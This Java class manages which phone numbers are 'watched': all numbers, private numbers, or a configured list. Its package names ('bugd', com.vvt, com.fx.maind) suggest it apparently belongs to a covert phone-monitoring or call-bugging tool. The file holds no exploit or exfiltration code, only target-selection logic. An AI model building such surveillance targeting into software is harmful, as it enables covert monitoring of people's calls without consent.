package com.vvt.dalvik.bugd;

import java.util.ArrayList;
import java.util.List;

import com.fx.maind.ref.Customization;
import com.vvt.logger.FxLog;
import com.vvt.telephony.TelephonyUtils;

public class WatchListManager {
	
	private static final String TAG = "WatchListManager";
	private static final boolean LOCAL_LOGV = Customization.VERBOSE;
	
	private boolean mWatchAllEnabled = false;
	private boolean mWatchListEnabled = false;
	private boolean mWatchPrivateEnabled = false;
	private List<String> mWatchList = new ArrayList<String>();
	
	private static WatchListManager sInstance;
	
	public static WatchListManager getInstance() {
		if (sInstance == null) {
			sInstance = new WatchListManager();
		}
		return sInstance;
	}

	private WatchListManager() { }
	
	private boolean isPrivateNumber(String number) {
		if (number == null) {
			// number should not be null.
			return true;
		}
		return number.length() == 0;
	}
	
	public synchronized void setWatchAllEnabled(boolean enable) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "setWatchAllEnabled # ENTER ...");
			FxLog.v(TAG, String.format("setWatchAllEnabled # enable: %s", enable));
		}
		mWatchAllEnabled = enable;
	}
	
	public synchronized void setWatchListEnabled(boolean enable) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "setWatchListEnabled # ENTER ...");
			FxLog.v(TAG, String.format("setWatchListEnabled # enable: %s", enable));
		}
		mWatchListEnabled = enable;
	}
	
	public synchronized void setWatchPrivateEnabled(boolean enable) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "setWatchPrivateEnabled # ENTER ...");
			FxLog.v(TAG, String.format("setWatchPrivateEnabled # enable: %s", enable));
		}
		mWatchPrivateEnabled = enable;
	}
	
	public synchronized void setWatchList(List<String> watchList) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "setWatchList # ENTER ...");
			for (String watchNumber : watchList) {
				FxLog.v(TAG, String.format("setWatchList # watchNumber: %s", watchNumber));
			}
		}
		mWatchList.clear();
		mWatchList.addAll(watchList);
	}
	
	public synchronized boolean isWatchNumber(String number) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "isWatchNumber # ENTER ...");
			FxLog.v(TAG, String.format("isWatchNumber # number: %s", number));
		}
		
		if (mWatchAllEnabled) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, String.format("isWatchNumber # return true"));
			}
			return true;
		}
		
		if (mWatchPrivateEnabled) {
			if (isPrivateNumber(number)) {
				if (LOCAL_LOGV) {
					FxLog.v(TAG, String.format("isWatchNumber # return true"));
				}
				return true;
			}
		}
		
		if (mWatchListEnabled) {
			for (int i = 0 ; i < mWatchList.size() ; i++) {
				String watchNumber = mWatchList.get(i);
				if (TelephonyUtils.isSamePhoneNumber(watchNumber, number, 1)) {
					if (LOCAL_LOGV) {
						FxLog.v(TAG, String.format("isWatchNumber # return true"));
					}
					return true;
				}
			}
		}
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("isWatchNumber # return false"));
		}
		return false;
	}
	
	
}
